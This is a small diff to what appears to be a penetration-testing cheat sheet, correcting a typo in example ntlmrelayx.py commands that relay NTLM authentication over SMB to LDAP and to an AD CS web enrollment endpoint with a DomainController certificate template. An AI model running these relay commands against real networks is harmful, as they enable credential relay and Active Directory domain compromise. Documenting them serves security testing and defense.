@@ -36,7 +36,7 @@ Example relays:
 
 ```
 ntlmrelayx.py -smb2support
-ntlmrelayx.py -t ldap://1<TARGET_IP> -smb2support
+ntlmrelayx.py -t ldap://<TARGET_IP> -smb2support
 ntlmrelayx.py -t http://<TARGET_IP>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
 ```
 
